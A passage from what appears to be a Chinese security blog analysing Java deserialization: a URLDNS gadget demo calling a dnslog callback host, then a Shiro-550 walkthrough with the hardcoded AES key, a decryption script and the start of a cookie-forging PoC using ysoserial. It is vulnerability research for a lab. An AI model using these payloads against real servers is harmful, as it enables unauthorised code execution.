16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½® put æ—¶ä¸å‘èµ· dns è§£æ</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„å°†putä¹‹å hashCode çš„ å€¼é‡æ–°èµ‹å€¼ä¸º -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡åºåˆ—åŒ–ï¼Œå‘ç°ç¡®å®æ²¡æœ‰åœ¨payloadç”Ÿæˆé˜¶æ®µå‘èµ·dnsè§£æã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡è¯»å–<code>out.bin</code> æ–‡ä»¶å°†å…¶ååºåˆ—åŒ–æ¥æ¨¡æ‹Ÿæ¼æ´ç‚¹ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// ååºåˆ—åŒ–è¯»å– out.bin æ–‡ä»¶</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">è¯·æ±‚æˆåŠŸã€‚</p>
<p>æœ€åå›é¡¾ä¸€ä¸‹æ•´ä¸ªæµç¨‹:			</p>
<pre><code>1. å°†URLå¯¹è±¡ä½œä¸ºkeyæ”¾å…¥hashMapä¸­ï¼Œå°†å…¶åºåˆ—åŒ–å‘é€ç»™ç›®æ ‡æœºå™¨
2. å¦‚æœç›®æ ‡æœºå™¨å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œ`HashMap.readObject()` å°†æ•°æ®ååºåˆ—åŒ–
3. åœ¨ååºåˆ—åŒ–æœŸé—´ï¼Œä¸ºäº†è¿˜åŸhashmapçš„å†…å®¹ï¼Œä¼šè°ƒç”¨ `hash()` æ–¹æ³•ï¼Œè€Œ`hash()`å‡½æ•°ä¼šè°ƒç”¨ä¼ å…¥å‚æ•°çš„ `hashCode()`æ–¹æ³•
4. å½“URL å¯¹è±¡çš„ `hashCode`å±æ€§å€¼ä¸º `-1` æ—¶ä¼šè°ƒç”¨ `handler.hashCode()`æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•ä¼šè¿›è¡Œä¸€æ¬¡DNSæŸ¥è¯¢ã€‚
</code></pre>
<h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–æ¼æ´åˆ†æ(ä¸€)-Shiro550</title>
    <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
    <content><![CDATA[<blockquote>
<p>  æœ¬èœé¸¡ç®—æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼åˆ†æè¿™ç§ç©æ„ï¼Œå¾ˆçƒ‚ï¼Œéƒ½æ˜¯è·Ÿç€ç½‘ä¸Šçš„åˆ†ææ•™ç¨‹èµ°ä¸€éï¼Œç®—æ˜¯æ‰“å“javaååºåˆ—åŒ–æ¼æ´çš„ç¬¬ä¸€æªã€‚æˆ‘è¿˜æ¬ äº†ä¸¤ç¯‡æ–‡ç« ï¼Œè®°ç€å‘¢ã€‚</p>
</blockquote>
<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚åœ¨å®ƒç¼–å·ä¸º550çš„issue ä¸­çˆ†å‡ºä¸¥é‡çš„Javaååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>åœ¨Apache Shiro&lt;&#x3D;1.2.4ç‰ˆæœ¬ä¸­AESåŠ å¯†æ—¶é‡‡ç”¨çš„keyæ˜¯<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç ä¸­çš„ï¼Œè¿™å°±ä¸ºä¼ªé€ cookieæä¾›äº†æœºä¼šã€‚åªè¦rememberMeçš„AESåŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®ºshiroæ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>Shiroçš„â€œè®°ä½æˆ‘â€åŠŸèƒ½æ˜¯è®¾ç½®cookieä¸­çš„rememberMeå€¼æ¥å®ç°ã€‚å½“åç«¯æ¥æ”¶åˆ°æ¥è‡ªæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œå®ƒå°†é€šè¿‡æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥å¯»æ‰¾ä»–ä»¬è®°ä½çš„èº«ä»½ï¼š</p>
<ol>
<li>æ£€ç´¢cookieä¸­RememberMeçš„å€¼</li>
<li>Base64è§£ç </li>
<li>ä½¿ç”¨AESè§£å¯†</li>
<li>ååºåˆ—åŒ–</li>
</ol>
<p>æ¼æ´åŸå› åœ¨äºç¬¬ä¸‰æ­¥ï¼Œåœ¨Apache Shiro&lt;&#x3D;1.2.4ç‰ˆæœ¬ä¸­AESåŠ å¯†æ—¶é‡‡ç”¨çš„keyæ˜¯<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç ä¸­çš„ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æ„é€ RememberMeçš„å€¼ï¼Œç„¶åè®©å…¶ååºåˆ—åŒ–æ‰§è¡Œã€‚</p>
<blockquote>
<p>  åªè¦rememberMeçš„AESåŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®ºshiroæ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
</blockquote>
<h2 id="0x02-ç¯å¢ƒæ­å»º"><a href="#0x02-ç¯å¢ƒæ­å»º" class="headerlink" title="0x02 ç¯å¢ƒæ­å»º"></a>0x02 ç¯å¢ƒæ­å»º</h2><p>é¦–å…ˆä¸‹è½½æºç ï¼Œå¹¶åˆ‡æ¢æœ‰æ¼æ´çš„ç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210506223552.png" alt="image-20210506223546214"></p>
<p>ä¿®æ”¹<code>samples/web/pom.xml</code>ï¼Œæ”¯æŒjsp</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205022.png" alt="image-20210519210957110"></p>
<ol>
<li><p>Run</p>
</li>
<li><p>Edit Configurations</p>
</li>
<li><p>æ·»åŠ TomcatServer(Local)</p>
</li>
<li><p>Serverä¸­é…ç½®Tomcatè·¯å¾„</p>
</li>
<li><p>Deploymentä¸­æ·»åŠ Artifact</p>
</li>
<li><p>é€‰æ‹©sample-web:war exploded</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205028.png" alt="image-20210519212838979"></p>
<blockquote>
<p>  è¿™é‡Œè‹¥è¦ä½¿ç”¨burpsuiteï¼Œæ³¨æ„ç«¯å£ä¸è¦å’Œbpå†²çª</p>
</blockquote>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205034.png" alt="image-20210519210846672"></p>
<p>ç„¶åè¿è¡Œå³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205039.png" alt="image-20210519212950043"></p>
<h2 id="0x03-ä»£ç åˆ†æ"><a href="#0x03-ä»£ç åˆ†æ" class="headerlink" title="0x03 ä»£ç åˆ†æ"></a>0x03 ä»£ç åˆ†æ</h2><p>æ ¹æ® <a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> æè¿°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205046.png" alt="image-20210519211422639"></p>
<p>è¿™æ˜¯å‡ ä¸ªé‡è¦çš„ç‚¹:</p>
<ul>
<li>æ£€ç´¢<code>RememberMe</code> cookieçš„å€¼</li>
<li>Base64è§£ç </li>
<li>ä½¿ç”¨AESè§£å¯†</li>
<li>ä½¿ç”¨Javaåºåˆ—åŒ–ï¼ˆ<code>ObjectInputStream</code>ï¼‰ååºåˆ—åŒ–ã€‚</li>
</ul>
<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>å…ˆæ¥ç§ç§è¿™ä¸ªcookieï¼Œè¿›å…¥ç™»å½•ç•Œé¢ï¼Œåœ¨ç™»å½•æ—¶ï¼Œå‹¾é€‰<code>Remember Me</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205052.png" alt="image-20210519213228149"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>Base64</code>è§£ç å­˜å‚¨ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">rememberMe = <span class="string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span></span><br><span class="line"></span><br><span class="line">rememberMe_64 = base64.b64decode(rememberMe)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.write(rememberMe_64)</span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹:<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205104.png" alt="image-20210519214639370"></p>
<p>ä¸Šè¿°å†…å®¹ä¸­å¹¶æ²¡æœ‰åœ¨<a href="">åˆæ¢Javaååºåˆ—åŒ–æ¼æ´ï¼ˆä¸€ï¼‰</a>ä¸­æåˆ°è¿‡çš„åºåˆ—åŒ–çš„æ•°æ®æµä»¥é­”æœ¯æ•°å­—å’Œç‰ˆæœ¬å·<code>AC ED 00 05</code> ç­‰å­—æ ·ã€‚è¿™æ˜¯å› ä¸ºä¸Šè¿°å…³é”®æ­¥éª¤ä¸­æåˆ°äº†<code>AESè§£å¯†</code>ï¼Œæ‰€ä»¥éœ€è¦å»è·Ÿä¸€ä¸‹æºç ã€‚</p>
<h3 id="3-2-Shiro-500-ä¸­çš„-AES-è§£å¯†"><a href="#3-2-Shiro-500-ä¸­çš„-AES-è§£å¯†" class="headerlink" title="3.2 Shiro 500 ä¸­çš„ AES è§£å¯†"></a>3.2 Shiro 500 ä¸­çš„ AES è§£å¯†</h3><p>åœ¨IDEAä¸­<code>ctrl+shift+f</code> å…¨å±€æœç´¢<code>AES</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205115.png" alt="image-20210520201956272"></p>
<p>åœ¨<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>ä¸­æ‰¾åˆ°äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>Base64.decode(â€œkPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;â€)</strong> å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ç¡¬ç¼–ç å¯†é’¥ï¼Œå› ä¸ºAESæ˜¯å¯¹ç§°åŠ å¯†ï¼Œå³åŠ å¯†å¯†é’¥ä¹ŸåŒæ ·æ˜¯è§£å¯†å¯†é’¥ã€‚</p>
<p>ç„¶åçœ‹çœ‹shiroæ˜¯æ€ä¹ˆå¤„ç†è§£å¯†çš„ï¼Œå‘ä¸‹çœ‹ï¼Œæ‰¾åˆ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrypts the byte array using the configured &#123;<span class="doctag">@link</span> #getCipherService() cipherService&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encrypted the encrypted byte array to decrypt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="doctag">@link</span> #getCipherService () cipher&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°å<code>decrypt</code>ï¼Œæ˜¾è€Œæ˜“è§ï¼Œæ˜¯å¤„ç†è§£å¯†çš„ï¼Œ<code>cipherService</code>æ˜¯ä¸€ä¸ªæ¥å£,è°ƒç”¨äº†å…¶ä¸­çš„<code>decrypt</code>è§£å¯†æ–¹æ³•ï¼Œéœ€è¦ä¸¤ä¸ªå˜é‡<code>encrypted</code>(è¢«åŠ å¯†çš„æ•°ç»„) å’Œ <code>getDecryptionCipherKey()</code>(è·å–è§£å¯†ç§˜é’¥)ï¼Œå‰é¢è¯´äº†AESæ˜¯å¯¹ç§°åŠ å¯†ï¼Œå³åŠ å¯†å¯†é’¥ä¹ŸåŒæ ·æ˜¯è§£å¯†å¯†é’¥ã€‚è€Œä¸”ä»ç¨‹åºä¸­ä¹Ÿèƒ½çœ‹åˆ°ï¼Œç¡®å®æ˜¯åŒä¸€ä¸ªï¼Œé€šè¿‡åœ¨è¯¥ç±»ä¸­æŸ¥æ‰¾<code>setDecryptionCipherKey()</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205124.png" alt="image-20210520204036228"></p>
<p>å†æœç´¢<code>setCipherKey</code>ï¼Œå¯ä»¥çœ‹åˆ°æ„é€ æ–¹æ³•ä¸­ä¼ å…¥äº†<code>DEFAULT_CIPHER_KEY_BYTES</code>ä¹Ÿå°±æ˜¯<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>çš„å€¼<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205131.png" alt="image-20210520204113812"></p>
<p>ç„¶åå†çœ‹ä¸€ä¸‹<code>CipherService</code>è¿™ä¸ªæ¥å£çš„<code>decrypt</code>çš„å…·ä½“å®ç°ï¼Œ<code>ctrl+å³é”®</code>è·Ÿè¿›å»çœ‹çœ‹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205138.png" alt="image-20210520205000830"></p>
<p>è¿™åªæ˜¯ä¸ªæ¥å£ï¼Œå…¨å±€æœç´¢<code>implements CipherService</code> å‘ç°<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>å®ç°äº†<code>CipherService</code>æ¥å£ï¼Œè¿›å»çœ‹çœ‹<code>decrypt</code>æ–¹æ³•</p>
<p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼Œå‘ç°æ˜¯<code>CBC</code>æ¨¡å¼ï¼Œå¹¶ä¸” <code>iv</code>åç§»é‡çš„å€¼ä¸º **byte[] iv &#x3D; new byte[16] ** <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520215312.png" alt="image-20210520215309770"></p>
<p>åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬è§£å¯†ä¹‹å‰<code>base64è§£ç </code>åç”Ÿæˆçš„<code>rememberMe</code>æ–‡ä»¶å¾—åˆ°<code>decrypt.bin</code>æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_rememberme_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fpr:</span><br><span class="line">        key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode =  AES.MODE_CBC</span><br><span class="line">        IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">        remember_bin = encryptor.decrypt(fpr.read())</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520221430.png" alt="image-20210520221418998"></p>
<p>è¿™æ˜¯ Java åºåˆ—åŒ–çš„æ ‡å¿—ï¼Œè¯´æ˜è§£å¯†æˆåŠŸ</p>
<h3 id="3-3-ååºåˆ—åŒ–"><a href="#3-3-ååºåˆ—åŒ–" class="headerlink" title="3.3 ååºåˆ—åŒ–"></a>3.3 ååºåˆ—åŒ–</h3><p>çœ‹çœ‹è§£å¯†ä¹‹åçš„æ“ä½œï¼Œå›åˆ°<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>ç±»ä¸­ï¼Œçœ‹çœ‹ï¼Œä»å“ªé‡Œè°ƒç”¨äº†<code>decrypt</code>å‡½æ•°ï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074327.png" alt="image-20210521073527745"></p>
<p>åœ¨<code>convertBytesToPrincipals</code>è¿™é‡Œè§£å¯†ä¹‹åï¼Œæ‰§è¡Œäº†ååºåˆ—åŒ–<code>deserialize</code>ï¼Œè¿›å»ç…ç…<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074332.png" alt="image-20210521074103621"></p>
<p>é€šè¿‡è·å–<code>getSerializer()</code>æ¥è°ƒç”¨ååºåˆ—åŒ–ï¼Œå†çœ‹çœ‹<code>SetSerializer</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074338.png" alt="image-20210521074230279"></p>
<p><strong>src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;shiro&#x2F;io&#x2F;DefaultSerializer.java</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074341.png" alt="image-20210521074304324"></p>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯é»˜è®¤ååºåˆ—åŒ–ç±»ï¼Œæ²¡æœ‰ä»»ä½•æ£€éªŒï¼Œ<code>readobject()</code>è§¦å‘ååºåˆ—åŒ–!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092011.png" alt="image-20210521074629505"></p>
<h2 id="0x04-æ¼æ´æ¢æµ‹"><a href="#0x04-æ¼æ´æ¢æµ‹" class="headerlink" title="0x04 æ¼æ´æ¢æµ‹"></a>0x04 æ¼æ´æ¢æµ‹</h2><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†<strong>shiro550</strong>åœ¨è·å–åˆ°<strong>rememberMe cookie</strong>çš„å€¼åï¼Œé€šè¿‡ç¡¬ç¼–ç çš„KEY **kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<strong>è¿›è¡ŒAESè§£å¯†ï¼Œè§£å¯†å®Œæˆä¹‹åç›´æ¥è°ƒç”¨é»˜è®¤çš„ååºåˆ—åŒ–çš„</strong>readobject()**æ–¹æ³•ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•çš„æ ¡éªŒã€‚</p>
<p>å…·ä½“çš„ <strong>Payload</strong> ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå°†<code>payload</code>é€šè¿‡AESåŠ å¯†ä¼ªé€ <strong>rememberMe cookie</strong>,æˆ‘ä»¬é€šè¿‡åˆšæ‰çš„è§£å¯†æµç¨‹çŸ¥é“<strong>shiro550</strong>é‡‡ç”¨çš„<strong>CBC</strong>æ¨¡å¼ã€**byte[] iv &#x3D; new byte[16]**ï¼Œ é€šè¿‡è„šæœ¬ä¼ªé€ ï¼Œåˆ©ç”¨<code>ysoserial.jar</code> ç¥å™¨ç”Ÿæˆ<code>URLDNS</code>æ¢æµ‹çš„payloadè¿›è¡Œæ¢æµ‹(shiro550è‡ªå¸¦æ¥commons-collections3.2.1ï¼Œå…³äºcommons-collectionsçš„ç›¸å…³æ¼æ´ï¼Œåç»­åˆ†æ)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092006.png" alt="image-20210521091543563"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ï¼*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ï¼šhttps://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) 